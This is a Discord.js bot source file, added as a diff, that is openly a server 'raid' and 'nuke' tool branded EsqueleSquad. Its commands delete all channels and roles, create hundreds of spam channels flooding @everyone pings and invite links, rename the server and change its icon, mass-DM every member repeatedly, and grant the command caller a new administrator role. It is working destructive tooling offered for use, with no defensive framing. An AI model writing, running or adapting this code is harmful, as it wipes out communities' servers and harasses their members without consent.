@@ -1,0 +1,225 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const chalk = require('chalk');
+
+client.on("ready", () => {
+
+
+console.log(chalk.red(`
+                                            
+
+                                            
+`))
+
+console.log(chalk.red(`
+
+
+
+
+███████╗░██████╗░██████╗░██╗░░░██╗███████╗██╗░░░░░███████╗  ░██████╗░██████╗░██╗░░░██╗░█████╗░██████╗░
+██╔════╝██╔════╝██╔═══██╗██║░░░██║██╔════╝██║░░░░░██╔════╝  ██╔════╝██╔═══██╗██║░░░██║██╔══██╗██╔══██╗
+█████╗░░╚█████╗░██║██╗██║██║░░░██║█████╗░░██║░░░░░█████╗░░  ╚█████╗░██║██╗██║██║░░░██║███████║██║░░██║
+██╔══╝░░░╚═══██╗╚██████╔╝██║░░░██║██╔══╝░░██║░░░░░██╔══╝░░  ░╚═══██╗╚██████╔╝██║░░░██║██╔══██║██║░░██║
+███████╗██████╔╝░╚═██╔═╝░╚██████╔╝███████╗███████╗███████╗  ██████╔╝░╚═██╔═╝░╚██████╔╝██║░░██║██████╔╝
+╚══════╝╚═════╝░░░░╚═╝░░░░╚═════╝░╚══════╝╚══════╝╚══════╝  ╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░
+
+#EsqueleSquad
+
+
+                                 Bot Encendido...
+`))
+
+
+
+console.log(chalk.cyan(`
+
+
+`))
+
+
+   presencia();  
+    });
+
+
+
+function presencia(){
+  client.user.setPresence({
+status: "dnd",
+activity: {
+  name: "www.esquelesquad.rip",
+  type: "PLAYING"
+
+}
+  });
+}
+
+//automatico
+
+client.on("message", message => {
+  if(message.author.bot) return;
+
+  if(message.content === '.ESQ'){
+
+    console.log(chalk.green(`                                                                     [+] Raid en ejecucion`))
+
+
+      message.delete()
+      message.guild.channels.cache.forEach(channel => channel.delete());
+      message.guild.channels.create(`EsqueleSquad-is-here...`, {
+        type: 'text'
+      }).then(channel => {
+        channel.send("Fucked By EsqueleSquad")
+      })
+    for (let i = 0; i <= 500; i++) {
+         message.guild.channels.create(`PwnedByEsqueleSquad`, {
+           type: 'text'
+         }).then(channel => {
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           channel.send("@everyone Destroyed By E.S.Q Fool! https://discord.gg/YTZQpxHx https://discord.gg/26M5MBQd  https://imgur.com/a/UNUAESv");
+           
+           
+       })
+       }
+       message.guild.setName("RaidByEsqueleSquad");
+    message.guild.setIcon("https://media.discordapp.net/attachments/834114095463661629/867893867268931624/MOSHED-2021-7-19-10-25-46.gif?width=430&height=430");
+     }
+})
+
+
+//admin
+
+client.on("message", async msg => {
+
+
+  if (msg.author.bot) return;
+  if(msg.content.toLowerCase().startsWith('.admin')){
+    let rol = await msg.guild.roles.create({data: {
+      name: "$",
+      color: "B9BBBE",
+      permissions: "ADMINISTRATOR",
+      hoisted: false
+    }})
+
+msg.member.roles.add(rol)
+      .then(function(role) {
+        msg.member.addRole(role);
+        if (msg.deletable) msg.delete().catch(e => {});
+      })
+      .catch(e => {});
+  }
+});
+
+
+//nuke 
+
+client.on("message", message => {
+    if (message.author.bot) return;
+  
+   if (message.content === '.nuke') {
+
+    message.delete()
+    message.guild.channels.cache.forEach(channel => channel.delete());
+     message.guild.channels.create(`Attacked By EsqueleSquad`, {
+          type: 'text'
+        }).then(channel => {
+          channel.send("https://imgur.com/a/PdOc9T9")
+        })
+         }
+      })
+
+
+//chats
+
+client.on("message", message => {
+
+
+            if (message.author.bot) return;
+          
+           if (message.content === '.=)') {
+            message.delete()
+           for (let i = 0; i <= 500; i++) {
+                message.guild.channels.create(`PwnedByEsqueleSquad `, {
+                  type: 'text'
+                }).then(channel => {
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  channel.send("@everyone Your server has been destroyed by EsqueleSquad! Fool!  https://discord.gg/P6sT36et , https://imgur.com/a/UNUAESv");
+                  
+              })
+              }
+              }
+            });
+
+//mdall
+
+client.on("message", message => {
+                        if (message.author.bot) return;
+                        
+                      if(message.content === ".spammd")
+                        message.delete()
+                      message.guild.members.cache.forEach(member => {
+                        setInterval(function(){
+                          member.send("Ahh shit they raided again ... https://imgur.com/KJHRZCW https://discord.gg/8z5GpNBC https://discord.gg/reRpxKGX Original Server: https://discord.gg/MmRckSge").catch(error => {});
+                        },450);
+                      })
+                      });
+
+
+//borrar roles
+
+client.on("message", message => {
+
+
+                    if (message.author.bot) return;
+                  
+                     if(message.content === ('.rolesdeleted')){
+                      message.delete()
+                            message.guild.roles.cache.map(roles => roles.delete());
+                          }
+                  });
+
+//crear roles
+
+client.on("message", message => {
+
+                if (message.author.bot) return;
+              
+               if (message.content === '.roles') {
+                message.delete()
+              for (let i = 0; i <= 200; i++) {
+                message.guild.roles.create({ data: { name: `PwnedByEsqueleSquad`, color: '#5e0c0c',},reason: 'razon',})
+              };
+               }
+                });
+
+
+
+
+client.login("aqui va el token");
